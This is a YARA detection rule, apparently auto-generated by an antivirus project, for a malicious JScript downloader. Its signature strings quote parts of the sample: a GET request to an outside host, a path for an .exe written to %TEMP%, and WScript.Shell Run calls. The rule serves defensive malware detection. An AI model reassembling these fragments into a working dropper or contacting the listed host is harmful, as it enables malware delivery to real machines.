rule sig_20160328_01ddbd27487b248bc84526a7a697abee {
  meta:
    description = "datamaliciousorder - file 20160328_01ddbd27487b248bc84526a7a697abee.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2bc94a7321ec432592ef6485e1e3301c9f5897de34ee832951c1f5d297cad888"

  strings:
    $s1  = "function Domjudybwt() {return Dmyxelvav[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"tGU1wQJs.exe\";};" fullword ascii
    $s2  = "Ibykkerm[Aqfktsv](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Kfixyvp](Sozxjmganb() * 11)} while (Ibykkerm[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Kbndtaqy(Elnorxlk, Cokiluniv){return Elnorxlk - Cokiluniv;};" fullword ascii
    $s5  = "var Dmyxelvav = function Onmqdvcr() {return WScript[Yqzmhh](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Rhqldamt(Swyumc){Dmyxelvav[\"Run\"](Swyumc, Gvmhzrls, Gvmhzrls);};" fullword ascii
    $s7  = "function Uihwezvhsn() {return ((Bdopvomnfh == true) && (Bdopvomnfh == Iayljcsgj)) ? 1 : Gvmhzrls;};" fullword ascii
    $s8  = "var Vxvldgus = false;" fullword ascii
    $s9  = "function Ajttbw(){return Atkyja;};" fullword ascii
    $s10 = "function Ejqqmw(){return Yqzmhh;};" fullword ascii
    $s11 = "function Sozxjmganb(){return 22;};" fullword ascii
    $s12 = "var Iayljcsgj = false;" fullword ascii
    $s13 = "return Kbndtaqy(Jwakvfczux, Rjnvdynt);" fullword ascii
    $s14 = " while (Oschdl){" fullword ascii
    $s15 = "var Bdopvomnfh = false;" fullword ascii
    $s16 = "Bdopvomnfh = true; " fullword ascii
    $s17 = "var Qglbveraj = new this[\"Date\"]();" fullword ascii
    $s18 = "Iayljcsgj = true; " fullword ascii
    $s19 = "function Gbtraaabn(Boxjmmkb) {var Jgnrlvd = (1, 2, 3, 4, 5, Boxjmmkb); return Jgnrlvd;};" fullword ascii
    $s20 = "function Jfujutlyb()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}